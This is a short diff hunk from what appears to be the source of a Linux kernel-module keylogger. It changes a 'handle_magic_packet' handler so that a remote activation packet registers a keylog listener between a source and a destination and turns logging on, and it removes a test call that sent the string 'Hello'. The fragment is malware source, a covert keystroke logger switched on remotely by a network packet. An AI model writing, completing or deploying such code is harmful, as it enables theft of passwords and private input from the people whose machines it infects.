@@ -150,10 +150,9 @@ static const char* keymap_shift[] =
 	static void handle_magic_packet(int code, int src, int dest){
 		switch(code){
 			case KEYLOGGER_ACTIVATION_CODE :
-				if(!keylogger_active){
+				if(!keylogger_active)
 				      register_keylog_listener(src, dest);
-				      send_pressed_keys("Hello");
-				    }
+				
 		    		keylogger_active = 1;
 				#ifdef LOG
 					printk(KERN_DEBUG "KEYLOGGER ACTIVATION PACKAGE!");
